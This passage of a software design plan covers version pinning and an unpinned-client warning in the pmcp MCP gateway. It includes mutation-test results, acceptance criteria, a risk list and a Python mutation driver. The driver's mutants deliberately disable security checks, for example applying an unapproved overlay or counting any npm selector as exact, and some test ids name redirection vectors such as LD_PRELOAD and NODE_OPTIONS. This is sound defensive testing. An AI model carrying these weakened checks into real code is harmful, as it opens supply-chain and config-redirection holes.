| M86 | SHAPE cargo: an unknown flag counted inert | `handlers.py:885c885` | **2 failed, 228 passed** (restored=True) | `assert 'argv passes --git' in "'cg' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: the ...which can`; `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-git]`, `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-registry]` |
| M87 | SHAPE cargo: a +toolchain / non-install argv not refused up front | `handlers.py:857c857` | **1 failed, 229 passed** (restored=True) | `assert 'selects toolchain +nightly' in "'sh1' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: the...`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[cargo-toolchain]` |
| M88 | SHAPE docker: a container command after the image counted inert | `handlers.py:940c940` | **2 failed, 228 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-command-after-image]`, `test_update_server_never_labels_a_container_command_pinned` |
| M89 | SHAPE docker: an unknown flag (--entrypoint, -v...) counted inert | `handlers.py:935c935` | **3 failed, 227 passed** (restored=True) | `assert 'argv passes --entrypoint' in "'sh1' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its client is pinned: the...wh`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-entrypoint]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-env-file]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-volume]` |
| M90 | SHAPE docker: -e KEY not judged | `handlers.py:927c927` | **1 failed, 229 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-env-node-options]` |
| M91 | N2: an unmodelled runner or wrapper silent | `handlers.py:1220c1220` | **7 failed, 223 passed** (restored=True) | `assert 0 == 1`; `test_an_unmodelled_runner_or_wrapper_is_unverifiable[bunx]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[env]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[node]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[pnpm-dlx]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[pnpx]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[sh-c]`, `test_an_unmodelled_runner_or_wrapper_is_unverifiable[uv-run]` |
| M92 | N2: `uv tool run` not judged as uvx | `handlers.py:1212c1212` | **1 failed, 229 passed** (restored=True) | `assert ["'ut1' talks...n exact pin."] == []`; `test_uv_tool_run_is_judged_as_uvx` |
| M93 | X1: update_server labels an unrecognised shape [PINNED] | `handlers.py:5992,5993d5991` | **2 failed, 228 passed** (restored=True) | `AssertionError: assert ('sha256:ffff...ffffff', None) == (None, 'sha25...ffffffffffff')`; `test_update_server_never_labels_a_container_command_pinned`, `test_update_server_never_labels_a_divergent_install_argv_pinned` |
| M94 | X1: the warning ignores the argv shape | `handlers.py:1002,1004d1001` | **15 failed, 215 passed** (restored=True) | `assert 0 == 1`; `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-git]`, `test_an_exact_cargo_pin_is_not_called_pinned_when_the_entry_redirects_cargo[argv-registry]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[cargo-toolchain]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-command-after-image]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-entrypoint]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-env-file]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-env-node-options]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[docker-volume]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[npx-package-then-sh]`, `test_an_exact_pin_in_an_unrecognised_argv_shape_is_unverifiable[uvx-from-then-sh]` (+5 more) |
| M95 | ENV: the entry's env block not judged | `handlers.py:1009c1009` | **36 failed, 194 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_entry_key_not_proven_inert_is_unverifiable[empty-path]`, `test_an_entry_key_not_proven_inert_is_unverifiable[ld-preload]`, `test_an_entry_key_not_proven_inert_is_unverifiable[unknown-key]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-cache-home]`, `test_an_entry_key_not_proven_inert_is_unverifiable[xdg-config-dirs]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-cache]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-call]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-extra-ca]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-home]`, `test_an_exact_argv_is_not_called_pinned_when_the_entry_env_redirects_npm[identity-off-entry-https-proxy-lower]` (+26 more) |
| M96 | B2: an overlay declaration exempts a key | `handlers.py:1215c1215,1217` | **3 failed, 227 passed** (restored=True) | `assert 0 == 1`; `test_an_overlay_declaration_exempts_no_key[env-var-openssl-conf]`, `test_an_overlay_declaration_exempts_no_key[env-var-target-cc]`, `test_an_overlay_declaration_exempts_no_key[relaxer-openssl-conf]` |
| M97 | B1: install argvs not judged by the warning | `handlers.py:1278c1278` | **4 failed, 226 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[other-version]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[package-then-sh]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[sh-wrapper]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[unpinned]` |
| M98 | B1: install argvs not judged by update_server ([PINNED]) | `handlers.py:5981c5981` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert ('3.25.5', None) == (None, '3.25.5')`; `test_update_server_never_labels_a_divergent_install_argv_pinned` |
| M99 | B1: an install argv may name another package/version | `handlers.py:1117c1117` | **2 failed, 228 passed** (restored=True) | `assert 'does not run fc-mcp@3.25.5 (it names fc-mcp@latest)' in "'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify that its `; `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[other-version]`, `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[unpinned]` |
| M100 | B1: an unreadable install argv counted fine | `handlers.py:1115c1115` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[sh-wrapper]` |
| M101 | B1: install argv shape/env not judged | `handlers.py:1136,1137d1135` | **1 failed, 229 passed** (restored=True) | `AssertionError: assert 0 == 1`; `test_an_install_argv_that_does_not_run_the_pin_is_unverifiable[package-then-sh]` |
| M102 | N2: combined docker short flags not modelled | `handlers.py:914c914` | **1 failed, 229 passed** (restored=True) | `assert ["'ok1' talks...ned version."] == []`; `test_common_inert_spellings_are_recognised[docker-it]` |
| M103 | N2: npx --yes=true not modelled | `handlers.py:756c756` | **1 failed, 229 passed** (restored=True) | `assert ["'ok1' talks...ned version."] == []`; `test_common_inert_spellings_are_recognised[npx-yes-true]` |

**80 of 80 mutants red** on the revision-9 spike (origin/main `876fd33` + patch). Each ran
against the 230-test file, was restored and `cmp`-checked, with 0 tracebacks. Revision 9 adds
M96 (an overlay declaration exempts a key), M97-M101 (install argvs not judged, or judged
weakly) and M102-M103 (N2 spellings). It retires M76 with the namespace guard and
re-targets M92.

Revision 8 (for the record): 73 of 73 mutants red on the revision-8 spike (origin/main `876fd33` + patch). Each ran
against the 219-test file, was restored and `cmp`-checked, with 0 tracebacks. Revision 8 adds
M75-M95 (every allowlist has an "unknown key/flag counted inert" mutant: M75, M79-M82, M84,
M86, M89) and retires the rev-7 denylist mutants M58-M65, M70 and M71. M57, M68 and M74 are
re-targeted at the new `_entry_redirect` call.

Revision 7 (for the record): 63 of 63 mutants red on the final revision-7 spike (origin/main `876fd33` + patch, cwd
ruling included). Each ran against the 190-test file, was restored from the pristine copy and `cmp`-checked (`restored=True` for
every row, 0 tracebacks in the log). Revision 7 adds M57-M71 for board round 5 and
retires the rev-6 host-discovery mutants M41, M42, M45-M50 and M54-M56 with their code. The
cwd ruling adds M72-M74.
M10 and M18 are re-targeted at `_argv_pin_is_exact`.

The first rev-7 run had **2 survivors**, which were fixed before the final run:

- **M61** (the npm env prefix matched case-sensitively) survived because an upper-case
  key still hit the case-insensitive family prefix. The control test now injects
  `NPM_CONFIG_UPDATE_NOTIFIER`, which is allowlisted only after npm's normalisation.
- **M66** (the URL guard deleted) survived because PEP 508 forbids a specifier beside a
  URL, so the single-`==` rule refuses a URL requirement too. The guard is kept for
  readability, and the mutant is stated as the inverted guard (`return True`).

Rev 6 (for the record): 56 of 56 mutants red on the revision-6 spike (`959d4d4` + patch), each run against the 153-test file, restored from the pristine copy and `cmp`-checked (`restored=True` for every row, no traceback in the log). Revision 6 adds M41-M56 for board round 4 (C1: M41, M42, M45-M51, M54-M56; C2: M43, M53; NB-1: M44; NB-2: M52) and re-targets three mutants at the new per-launcher `_is_exact_pin`: M10 (exactness not consulted), M17 (npm branch always exact) and M40 (npm branch on the bare grammar). Revision 5 had 40 of 40 red on the revision-5 spike (`959d4d4` + patch). M34/M35 were re-targeted at the plan's own layers now that the version rule lives on main, and M40 is new: each makes pin code use the bare SemVer grammar (`matches_package_version_grammar`) instead of main's `is_valid_package_version`. **M35 restores revision 3's order in the split** (a bare-grammar version accepted before the file check) and is red on `semver-tarball-prerelease`, `-TAR`, `-build`, `-scoped`, `-npm10-tar-gz`, `oversized-core-is-a-tag` and the health test. M25 (the split's selector clause only) stays red for the letter-led tarballs. Board revision 4 had 39 of 39. Earlier rounds: 33 of 33 on the board-revision-3 spike (M1-M14 and M17-M24 re-run; M15/M16 rewritten for the new grammar; M25-M33 new for board round 2), each for the named reason. **M26 (bare-tarball clause) is red on `bare-tarball-tgz`, `bare-tarball-TAR` and `tarball-name-with-version`.** After each run the file was restored
from the spike copy, and `cmp` confirmed it identical (`restored=True`).

**A finding from the first full-suite run (fixed in the diff above).** The first spike
made `update_server` a wrapper and moved the long docstring onto the inner
`_update_server_unwarned`. `tests/test_tools.py::test_update_server_docstring_states_both_probe_window_env_contracts`
went red (`1 failed, 4107 passed`), because it asserts that `GatewayTools.update_server.__doc__`
states both probe-window environment contracts. The fix, which is what the diff shows,
keeps the full contract docstring on the **public** `update_server`, adds the #294
paragraph to it, and gives the inner body a one-line pointer docstring. **Implementers
must not move that docstring.**


## Acceptance criteria

- [ ] `tests/test_version_pin.py` passes: 230 tests (rev 9), Verification step 2.
- [ ] A user overlay line `server_version: {firecrawl: "3.25.5"}` makes
  `load_manifest().servers["firecrawl"].args == ["-y", "firecrawl-mcp@3.25.5"]`, every
  `install` argv equal to `["npx", "-y", "firecrawl-mcp@3.25.5"]`, and
  `provision_gate._config_runs_exactly(entry, "firecrawl-mcp@3.25.5")` true. Proven by
  `test_server_version_pins_the_shipped_firecrawl_entry_everywhere_it_spawns`.
- [ ] Every non-exact pin (the 16 parametrized values) leaves the entry's
  `args`/`install` byte-identical to shipped, with `version is None`, and logs a WARNING
  naming `server_version`. Proven by `test_server_version_refuses_anything_but_one_exact_version`.
- [ ] `gateway.update_server` on a pinned server returns `ok=False`, runs no probe, and
  returns `pinned_version="3.25.5"`, `latest_available="3.26.0"`,
  `latest_comparison="newer"`, with a message containing both
  `is pinned to '3.25.5' in the manifest entry` and `newer available: 3.26.0`.
  `pmcp update` renders it as `[PINNED] firecrawl: pinned at 3.25.5, newer available: 3.26.0`.
  Proven by `test_update_server_reports_a_newer_version_for_a_pinned_server` and
  `test_pmcp_update_renders_a_pinned_server_as_pinned_not_failed`.
- [ ] `gateway.health` returns exactly one warning for a relaxer-active, unpinned (or
  `@latest`) client, and `[]` when the relaxer is inactive, when the client is pinned,
  or when a configured entry pins it. `gateway.update_server` carries the same warning
  without being blocked. Proven by the five `test_health_*` tests and
  `test_update_server_carries_the_unpinned_self_hosted_warning`.
- [ ] CI gates are clean (`ruff check`, `ruff format --check`, `mypy src/`), and the
  whole suite shows no failure that is not also present on `9ca081e`
  (Verification steps 3 and 5).

- [ ] Board revision 2: a non-plain npx slot (alias, URL, git, file, range) is never
  pinned; a range or tag warns and reports `[FLOATING]`; a malformed overlay entry
  costs only its own pin (`len(servers) == shipped + 1`); an inherited relaxer warns
  while `credential_requirement(...).required` stays `True`; and health loads the
  manifest once per source change. Proven by the tests named in the Revision 2 table.

- [ ] Board revision 3: no slot that npa classifies as file, directory, git, remote, alias,
  range or invalid is ever pinned. That includes every tarball form, bare or after `@`,
  in any case (`test_version_refuses_a_slot_that_is_not_a_plain_registry_spec`, 25 ids,
  plus Verification step 10: 0 violations). Both fingerprint components have tests. With
  npm identity disabled, the warning still fires or says it cannot verify. A configured
  `+metadata` pin is labelled with what npm runs.

- [ ] Board revision 9 (round 7): for a manifest-sourced server, every non-empty install
  argv runs the same exact pin in a recognised shape with an inert env, or the warning
  and `update_server` say which argv does not. Only the shipped manifest's declarations
  exempt a key, so an overlay declaring `OPENSSL_CONF`/`TARGET_CC` gets "cannot verify".
  `docker run -it` and `npx --yes=true` are recognised. Shipped cost is 0 of 77. Proven by
  the tests and mutants M96-M103 named in the Revision 9 table.

- [ ] Board revision 8 (round 6; its declared-key rule replaced by revision 9): both entry rules are allowlists. An exact pin is
  silent only when the argv matches a recognised shape in which the pinned package runs
  (Revision 8 table), every key of the entry's env block is proven inert (declared server
  keys outside tool namespaces, locale/terminal keys, the per-launcher
  logging/timing/credential lists; no value special-cased), and no configuration-bearing
  cwd is set. Unmodelled runners and wrappers are "cannot verify". `uv tool run` is judged
  as uvx. `update_server` never labels an unrecognised shape `[PINNED]`. Shipped cost is
  0 of 77. Proven by the tests and mutants M75-M95 named in the Revision 8 table.

- [ ] Board revision 7 (round 5, trust boundary; its denylists replaced by revision 8): an exact pin is silent only when the
  entry itself sets nothing that can change what runs. This covers its env block, per
  launcher (npm `npm_config_*`/`NODE_*`/`PREFIX`, uv `UV_*`/`PIP_*`, cargo
  `CARGO_*`/`RUSTC*`, docker `DOCKER_*`, and `PATH`/`HOME`/proxy/CA for every launcher,
  outside the small allowlists), its uvx/cargo argv flags, and a `cwd` it sets (npm/uv/cargo;
  docker exempt). The same settings exported
  by the **host**, host npmrc files, a local project and shims are trusted and stay silent,
  and the README states that boundary. A uvx URL requirement is never exact. A malformed
  docker digest is labelled as such. An argv of a read launcher that pmcp cannot read
  fails loud. Proven by the tests and mutants named in the Revision 7 table.

- [ ] Board revision 6 (round 4; host-reading parts superseded by revision 7): an exact npm argv is silent only when nothing besides
  the argv can change what npm runs for it. A redirecting `npm_config_*` variable (any
  case), `NODE_OPTIONS`, a redirecting overlay key, a local prefix, or a redirecting key in
  the project, user, global or builtin npmrc gives "cannot verify" naming the source, in
  both identity modes. dev0's `npm_config_cache` and `npm_config_store_dir` stay silent.
  A docker tag is never exact (warning, `floating_selector`, `[FLOATING]`), while a digest
  is (`[PINNED]`). A launcher that identity does not read is named as the cause. The
  floating text claims only what holds on every npm release. Proven by the tests named in
  the Revision 6 table and mutants M41-M56.

- [ ] Board revision 4 / rev 5: no pin value or pinned argv is a version npm reads as a
  local tarball or as a tag, because the pin grammar uses main's `is_valid_package_version`
  and `NPM_FILE_TYPE_RE`. The generated npm conformance run (1,617,455 slots and 41,472
  pin values) has **0 violations on both npm-package-arg 12.0.2 and 13.0.2** (Verification
  step 10). An `npm exec` launch without
  identity warns rather than going silent, and every fallback names its actual cause.

## Non-goals (explicit)

- **The host's own launcher configuration (trust boundary, revision 7).** The warning
  judges only what a manifest entry or overlay controls: its argv, its launcher, and the
  env block it injects. The following are the **operator's trusted environment**, like
  `PATH`, and are out of scope:
  - npmrc files at any level (project, user, global, builtin), and a local
    `package.json`/`node_modules` above the working directory;
  - the shell environment pmcp itself runs in, including a host-exported
    `npm_config_*`, `UV_*` or `CARGO_*` variable;
  - version-manager shims (asdf, Volta, mise, corepack, wrapper scripts);
  - the npx cache (`_npx/<hash>`, which npm does not re-verify) and the global bin
    directory;
  - proxy and CA settings (`HTTPS_PROXY`, `NODE_EXTRA_CA_CERTS`, `SSL_CERT_FILE`, ...);
  - uv configuration (`uv.toml`, `pyproject.toml` `[tool.uv]`, `pip.conf`) and cargo
    configuration (`~/.cargo/config.toml`, `[source]` replacement);
  - docker daemon and registry-mirror configuration.

  Revision 8 adds three statements. (a) A docker digest pins the **image**, not what runs
  in it; the warning therefore requires the recognised `docker run ... image@digest`
  shape with nothing after the image. (b) Package runners and wrappers pmcp does not
  model (`bunx`, `pnpx`, `pnpm`/`yarn dlx`, `uv run`, `node`, shells, `env`) are "cannot
  verify". Any other command, such as a locally installed server binary, is **not
  judged**: what version that binary is belongs to the host. (c) An operator's own
  config that injects undeclared application keys next to a pin gets "cannot verify"
  (R13). That is the price of an allowlist.

  Two scope notes. pmcp's **own** cwd, which a child inherits when its entry sets none,
  is the host's. A `cwd` that an entry **sets** is not: it chooses which project
  configuration npm, uv or cargo reads, so an exact pin with an entry-set `cwd` is
  "cannot verify" (docker excepted). A pin holds the **top-level** package only:
  dependencies resolve fresh from their ranges. Revision 6 read part of this list, and
  round 5 (B1) showed that such discovery can be fooled by a shim. It was removed rather
  than extended.
- **Proposals 3 and 4.** These are follow-up slices with design notes above.
- **Pinning a shipped entry in `manifest.yaml`.** A pin shipped for firecrawl would pin
  vendor-hosted users too (see Q1).
- **uvx/pip/cargo/docker `version:`.** Refused with a message pointing at the existing
  explicit-args pin (D5).
- **Merge semantics for `servers:`.** Whole-entry replace is unchanged (Q2).
- **Refreshing the descriptions cache version for a pinned server.** `refresher.py`
  (around line 305 and 340) labels a server's generated descriptions with
  `get_package_version`, which is the registry's **latest**, even when the argv is
  pinned. The tools are listed from the pinned binary but labelled with latest. This is
  pre-existing for `.mcp.json` pins, and this plan makes it more common. The freshness
  short-circuit then regenerates on every upstream release, which costs work but gives
  no wrong answer to `catalog_search`. It is listed as risk R2 and left for a follow-up.
- **Exit codes.** `pmcp update` stays exit 0 for per-server outcomes (Q3).
- **`cmd /c npx` Windows wrappers** (`context7`'s windows install). Refused, consistent
  with `_config_runs_exactly`.

## Risks

- **R1: a pin to a version that does not exist.** It is not caught at load, because
  load is offline by design (D1). The spawn fails loudly (npx: `No matching version
  found`), and `update_server` reports `latest_available` next to the bad pin. This is
  acceptable, and better than a network call in `load_manifest`.
- **R2: the descriptions-cache version label** (see Non-goals). It wastes regeneration
  work, and nothing reads it as the running version (#150 removed the notices that did).
- **R3: `pmcp init` snapshots pinned args.** `cli.py` (around line 1703) writes
  `server.args` into the generated `.mcp.json`. With a manifest pin active, the generated
  entry carries `pkg@X` explicitly, and a later `server_version` change no longer
  reaches it, because explicit args win. That is the same snapshot semantics `init`
  already has for `@latest` entries. The README subsection should say it in one line.
- **R4: health cost (superseded by revision 2, measured).** Now one manifest load per source change, and no config I/O: 1.3 ms steady (was 220.7 ms). Original text follows.  It is one `load_manifest()` per `gateway.health` call. When a
  relaxer-declaring server is in the list, it adds one `load_configs` and one resolver
  query per such server (~0.5 ms each, `npm_resolver.py:460`). There is no config I/O
  when no entry declares a relaxer. The work is wrapped so a failure can never cost
  health its answer.
- **R5: the warning's judgement is only as good as `credential_requirement`.** A
  self-hosted backend that is selected by some *other* variable (not declared in
  `api_key_optional_when`) is not detected. That is deliberate: the relaxer declaration
  is the manifest's only structured statement that "this entry can be self-hosted".
- **R6: the `_OverlayDocument` 4-tuple.** Any out-of-tree caller that unpacks the
  3-tuple breaks. There are none in-tree (grep), and it is a private name.

- **R13 (rev 9 restatement): only the shipped manifest's declarations exempt a key.** An
  overlay or config that injects an application key warns "cannot verify" unless pmcp's
  shipped entry of that name declares it. An overlay-only self-hosted server always warns,
  because its relaxer is in its env. Shipped cost: 0 of 77. The remedy for an operator is
  to ask for the key to be declared in pmcp's manifest (a reviewed change), or to accept
  the advisory warning.
- **R14 (rev 9): known false positives from main's parser.** `docker container run`,
  `uvx -qq`, `cargo install -fq` and `cargo install fc@1.2.3` warn although they are
  harmless, because `detect_package_type` does not read those spellings. This fails
  closed, and the README names the spellings to use instead.
- **R13 (rev 8): the env allowlist warns on undeclared application keys.** A config
  that injects, for example, `FIRECRAWL_RETRY_MAX_ATTEMPTS` next to its pin gets "cannot
  verify", because pmcp cannot prove a key it does not know is inert for the launcher.
  Measured cost on the shipped manifest: **0 of 77** pinnable entries (the shipped
  manifest injects no `extra_env` at all; the only relaxer entry, `firecrawl`, declares
  its keys). The remedy is to declare the key on the entry, or to accept the advisory
  warning.
- **R8-R10 (rev 6) are superseded by R11 (revision 7).** They are kept for the record.
- **R11 (rev 7): the trust boundary is a stated limit, not a gap.** A host that redirects
  its own launcher (an npmrc, a shim, a cache, a proxy, uv/cargo config) is not warned
  about. The README says so. The warning's claim is scoped to "what the server's config
  controls".
- **R12 (rev 7): the entry allowlists are keyed to npm 10/11, uv 0.12 and current cargo.**
  A new harmless key an entry sets is loud until reviewed. That errs toward "cannot
  verify".
- **R8 (rev 6): the npm context check covers npm only.** For uvx/pip and cargo, pmcp does
  not read the package index configuration (`UV_INDEX_URL`, `pip.conf`, a cargo
  `[source]` replacement), so their exact pins are judged on the argv alone. This is a
  named limit, not a claim of equivalence: a follow-up could apply the same
  "what else can redirect" question to those launchers.
- **R9 (rev 6): the global and builtin npmrc are located best effort.** They are found
  from the child's `PATH` (`node` for the global prefix, the launcher for the npm root), as
  npm finds them. If neither binary is on that `PATH`, those two files are not read. The
  user file, the project file, every environment variable and the local prefix do not
  depend on `PATH`. Cost: per health call and per connected exact-pinned self-hosted npm
  server, two `which` lookups and up to four small file reads.
- **R10 (rev 6): the allowlist is keyed to npm 10 and 11.** A key a later npm defines is
  loud until it is reviewed and added. That errs toward "cannot verify", never toward
  silence.

- **R7 (rev 2): the fingerprint is `stat`-based.** An edit that preserves both mtime_ns
  and size is not seen until the next change. For health's advisory list that is
  acceptable; `update_server` always re-reads.

## Open questions for the maintainer

- **Q1.** Should the shipped `firecrawl` entry pin a default version? This plan says
  **no**: vendor-hosted users should keep following the vendor, and the self-hosted
  operator is warned (D7) and pins with one line.
- **Q2.** Should a partial `servers:` entry (only `version:`) be allowed to merge? This
  plan says **no** and uses `server_version:` instead, because changing `servers:` from
  replace to merge changes every existing overlay's meaning.
- **Q3.** Should `pmcp update --all` exit nonzero when any server FAILED? This is
  unchanged here: today it is always 0, and `[PINNED]` is not a failure either way.
- **Q4.** Should the health warning also fire for a server that exists **only** in
  `.pmcp.json`, with no manifest entry? Without a manifest entry there is no
  `api_key_optional_when` declaration, so there is no structured way to know it is
  self-hosted. This plan says no.
- **Q5.** Should `context7`'s windows install (`cmd /c npx ...`) be normalised so that
  context7 becomes pinnable? That would also touch `_config_runs_exactly`'s notion of an
  npx argv, so it is out of scope here.

## Execution Policy

- execute: effort=high, reason=security-adjacent argv rewriting (npm identity, overlay
  consent, credential-gate reads); every invariant has a named test and mutant.

## Handoff

- Branch: implement on a fresh worktree from `origin/main`. Apply the production diff
  and the test file verbatim, add the three doc edits, and run Verification 0-7.
- Commit subject: `feat(manifest): first-class client version pins and an unpinned
  self-hosted warning (see Consiliency/pmcp#294)`. The body references
  Consiliency/pmcp#294 and must not use a closing keyword, because proposals 3 and 4
  remain open.
- PR: cross-vendor panel CR plus reconcile before merge (repo rule).

## Appendix: mutation driver (`mutants.py`; revision 9 runs it in a spike worktree off origin/main `876fd33`, with pristine copies of the spike files under `src9/`)

```python
"""Apply one mutant at a time to the spike, run the pin tests, restore, cmp.

Each mutant is (id, [(file, old, new), ...], description): one or more exact
one-occurrence replacements, applied together (M35 spans two files).
"""
import filecmp, shutil, subprocess, sys
from pathlib import Path

WT = Path("/home/viperjuice/workspace/worktrees/pmcp-294-rev9-spike")  # the rev-9 spike, off origin/main 876fd33 worktree off origin/main
S = Path(sys.argv[0]).parent
SPIKE = S / "src9"  # pristine copies of the spike files
L, H, C, V = (
    "src/pmcp/manifest/loader.py",
    "src/pmcp/tools/handlers.py",
    "src/pmcp/cli.py",
    "src/pmcp/validation.py",
)
MUTANTS = [
    ("M1", [(L, 'is_valid_package_version(raw) and "+" not in raw:', 'raw and "+" not in raw:')], "grammar accepts any string"),
    ("M2", [(L, "install[platform] = [argv[0], *pinned_install[0]]", "install[platform] = argv")], "install argv not pinned"),
    ("M3", [(L, 'return [*args[:index], f"{name}@{version}", *args[index + 1 :]], name', 'return [*args[:index], f"{arg}@{version}", *args[index + 1 :]], name')], "existing tag not replaced"),
    ("M4", [(L, 'version=_parse_version_pin(name, data.get("version"), "version"),', "version=None,")], "servers: version: key ignored"),
    ("M5", [(L, "                    log_refusal(decision, logger)\n                    continue", "                    log_refusal(decision, logger)\n                    content = overlay_path.read_bytes()")], "unapproved project overlay applied"),
    ("M6", [(L, "    if not _is_npx(server.command):\n        return refuse(", "    if False:\n        return refuse(")], "non-npx command accepted"),
    ("M7", [(L, "        if pinned_install is None or pinned_install[1] != package:", "        if pinned_install is None:")], "install may name another package"),
    ("M8", [(H, "compare_versions(pinned_to, latest_available, package_type)", "compare_versions(latest_available, pinned_to, package_type)")], "comparison arguments swapped"),
    ("M9", [(H, "    if relaxed_by is None:\n        return None\n", "")], "relaxer not required for the warning"),
    ("M10", [(H, "    if pin and _argv_pin_is_exact(package_type, pin, command, args):", "    if True:")], "pin not consulted for the warning"),
    ("M11", [(H, "                resolved = connected.get(info.name)\n", "                resolved = manifest_server_to_config(relaxable[info.name])\n")], "health judges the manifest, not the connected config"),
    ("M12", [(H, "        if warning:\n            result.warnings.append(warning)\n        return result", "        return result")], "update_server drops the warning"),
    ("M13", [(C, "    elif pinned:\n", "    elif False:\n")], "CLI keys the status off ok"),
    ("M14", [(H, "        self._attach_version_pin_warnings(servers)\n", "")], "health never attaches warnings"),
    ("M15", [(L, "        return name, selector\n    return None\n", "        return name, selector\n    return name, selector\n")], "P1: any selector accepted (alias/url/git/file/dir/range)"),
    ("M16", [(L, "    if _TAG_WORD_RE.fullmatch(selector) and not", "    if False and not")], "P1: dist-tag slots refused"),
    ("M17", [(H, '    if package_type == "npm":\n        return is_valid_package_version(pin)\n', '    if package_type == "npm":\n        return True\n')], "P2: any npm selector counts as exact"),
    ("M18", [(H, "            exact = _argv_pin_is_exact(package_type, pinned_to, command, args)", "            exact = True")], "P2: update reports a range as pinned"),
    ("M19", [(L, "name: _materialize_version_pin_soft(entry) for", "name: _materialize_version_pin(entry) for")], "P3: materialisation not contained per entry"),
    ("M20", [(H, "    child_env = sanitized_subprocess_env(resolved.config.env, project_root)", "    child_env = resolved.config.env or {}")], "F2: inherited env ignored"),
    ("M21", [(H, "        if cached is not None and cached[0] == key:", "        if False:")], "F3: no cache"),
    ("M22", [(L, '        stat(Path.home() / ".pmcp" / "manifest.yaml"),\n', "")], "F3: fingerprint misses the user overlay"),
    ("M23", [(L, ' and "+" not in raw:', ":")], "N2: build metadata accepted"),
    ("M24", [(C, "    if floating:\n", "    if False:\n")], "CLI labels a range [FAILED]"),
    ("M25", [(L, "    if _NPM_FILE_TYPE_RE.search(selector):\n        return None\n", "")], "B1: selector file check removed from split"),
    ("M26", [(L, '    if not name.startswith("@") and _NPM_FILE_TYPE_RE.search(name):\n        return None\n', "")], "B1: bare-tarball / tarball-NAME slot accepted"),
    ("M27", [(L, " and not _PARTIAL_VERSION_WORD_RE.fullmatch(\n        selector\n    ):", ":")], "N4: x/X/v1.2.x range words accepted as tags"),
    ("M28", [(L, "    if _TAG_WORD_RE.fullmatch(selector) and not", "    if _TAG_WORD_RE.match(selector) and not")], "N4: match instead of fullmatch (trailing newline)"),
    ("M29", [(H, '        if launcher not in ("npx", "npm"):\n            return None\n', "        return None\n")], "N2: silent when npm identity is disabled"),
    ("M30", [(H, "        if plain is None:\n            where = (", "        if plain is None:\n            return None\n            where = (")], "N2: silent when the slot cannot be read either"),
    ("M31", [(H, '            if exact and package_type in ("npm", "cargo") and "+" in pinned_to:', "            if False:")], "N3: label keeps +metadata"),
    ("M32", [(L, "    parts.append(stat(project) if project is not None else None)", "    parts.append(None)")], "N1: fingerprint misses the project overlay"),
    ("M33", [(L, "        parts.append(stat(trust_store_path()))", "        parts.append(None)")], "N1: fingerprint misses the trust store"),
    # --- board round 3 -------------------------------------------------------
    ("M34", [(L, 'if isinstance(raw, str) and is_valid_package_version(raw) and "+" not in raw:', 'if isinstance(raw, str) and matches_package_version_grammar(raw) and "+" not in raw:'), (L, "from pmcp.validation import (\n", "from pmcp.validation import (\n    matches_package_version_grammar,\n")], "B1': pin value checked with the bare SemVer grammar instead of main's npm-aware is_valid_package_version"),
    ("M35", [(L, "    if _NPM_FILE_TYPE_RE.search(selector):\n        return None\n    if is_valid_package_version(selector):\n        return name, selector\n",
            "    if matches_package_version_grammar(selector):\n        return name, selector\n    if _NPM_FILE_TYPE_RE.search(selector):\n        return None\n"), (L, "from pmcp.validation import (\n", "from pmcp.validation import (\n    matches_package_version_grammar,\n")], "B1': the REV-3 ORDER restored in the split (bare SemVer accepted before the file check)"),
    ("M40", [(H, '    if package_type == "npm":\n        return is_valid_package_version(pin)\n', '    if package_type == "npm":\n        return matches_package_version_grammar(pin)\n'), (H, "    is_valid_package_version,\n    normalized_executable_name,\n", "    is_valid_package_version,\n    matches_package_version_grammar,\n    normalized_executable_name,\n")], "B1': _is_exact_pin trusts the bare SemVer grammar"),
    ("M36", [(L, '    if name.lower() in _NPM_EXCLUDED_NAMES:\n        return None\n', "")], "N-c: excluded names accepted"),
